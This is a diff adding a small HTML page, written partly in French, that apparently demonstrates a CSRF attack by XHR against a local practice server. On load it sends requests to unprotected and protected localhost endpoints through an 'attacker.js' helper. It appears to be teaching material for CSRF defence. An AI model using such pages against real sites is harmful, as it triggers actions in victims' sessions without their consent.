@@ -1,0 +1,27 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>CSRF XHR Attack Exemple (local)</title>
+</head>
+<body>
+  <h1>Attaque CSRF par XHR (local)</h1>
+  <p>Ce fichier envoie une requête XHR vers la cible locale.</p>
+  <script src="/pratique/attacker.js"></script>
+  <script>
+    window.onload = function() {
+      attacker.sendXhr('http://localhost:5000/perform-action');
+    };
+    window.onload = function() {
+      const result = document.createElement('pre');
+      result.id = 'result';
+      result.textContent = 'En attente...';
+      document.body.appendChild(result);
+
+      attacker.sendXhr('http://localhost:5000/perform-action-protected', function(status, text) {
+        result.textContent = 'Status: ' + status + '\n' + text;
+        console.log('XHR result', status, text);
+      });
+    };
+  </script>
